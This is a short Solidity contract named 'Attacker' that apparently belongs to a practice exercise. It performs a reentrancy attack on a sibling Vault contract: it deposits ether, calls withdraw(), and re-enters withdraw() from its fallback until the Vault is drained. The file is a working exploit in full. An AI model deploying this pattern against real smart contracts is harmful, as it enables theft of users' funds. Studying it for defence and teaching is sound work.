// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vault.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract Attacker is Ownable {
    address payable vaultAddress;

    constructor(address targetAddress_, address owner_) Ownable(owner_) {
        vaultAddress = payable(targetAddress_);
    }

    fallback() external payable {
        if (address(vaultAddress).balance > 0 ether) {
            Vault(vaultAddress).withdraw();
        }
    }

    function attack() external payable onlyOwner {
        uint256 amount = msg.value;
        require(amount > 0, "amount must gt 0");

        Vault(vaultAddress).deposite{value: amount}();

        Vault(vaultAddress).withdraw();
    }

    function getBalance() external returns (uint256) {
        return address(this).balance;
    }
}
